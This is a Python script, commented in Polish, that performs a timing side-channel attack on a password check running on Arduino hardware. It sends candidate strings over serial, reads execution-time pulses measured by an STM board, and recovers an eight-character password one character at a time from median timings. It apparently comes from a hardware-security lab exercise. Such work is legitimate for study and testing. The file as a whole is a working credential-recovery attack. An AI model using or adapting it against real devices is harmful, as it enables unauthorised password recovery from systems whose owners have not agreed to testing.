import serial
import time
import statistics

def send_password_to_arduino(arduino_serial, password):
    """Send a password to the Arduino."""
    arduino_serial.write(f"{password}\n".encode())

def wait_for_arduino_response(arduino_serial):
    """Wait for a response from the Arduino."""
    while True:
        response = arduino_serial.readline().decode().strip()
        if response:
            return response

def measure_execution_time(stm_serial):
    """Measure the execution time from the STM."""
    while True:
        response = stm_serial.readline().decode().strip()
        if response.startswith("Pulse Duration:"):
            return int(response.split(":")[1].strip().split()[0])  # Extract time in ns

def timing_attack(repetitions=8):
    known_password = ""  # Odkrywane hasło
    charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"  # Możliwe znaki

    # Open serial connections
    with serial.Serial('COM5', 9600, timeout=1) as arduino_serial, \
         serial.Serial('COM4', 115200, timeout=1) as stm_serial:

        arduino_serial.reset_input_buffer()
        stm_serial.reset_input_buffer()
        time.sleep(2)  # Wait for the serial connections to be established
        for _ in range(8):  # Zakładamy długość hasła 8 znaków
            timings = []

            for char in charset:
                test_password = known_password + char + "A" * (7 - len(known_password))  # Padding
                repeated_timings = []

                # Repeat measurements to calculate median
                for _ in range(repetitions):
                    send_password_to_arduino(arduino_serial, test_password)
                    wait_for_arduino_response(arduino_serial)  # Wait for Arduino's response
                    exec_time = measure_execution_time(stm_serial)  # Measure timing from STM
                    repeated_timings.append(exec_time)

                # Calculate median timing for the current character
                median_time = statistics.median(repeated_timings)
                timings.append((char, median_time))

            # Find the character with the longest median execution time
            best_char = max(timings, key=lambda x: x[1])[0]
            known_password += best_char
            print(f"Odgadnięty dotychczasowy ciąg: {known_password}")

        return known_password

# Uruchamiamy atak
if __name__ == "__main__":
    print("Rozpoczynamy atak timingowy...")
    repetitions = 5  # Liczba powtórzeń dla obliczenia mediany
    recovered_password = timing_attack(repetitions)
    print(f"Odgadnięte hasło: {recovered_password}")
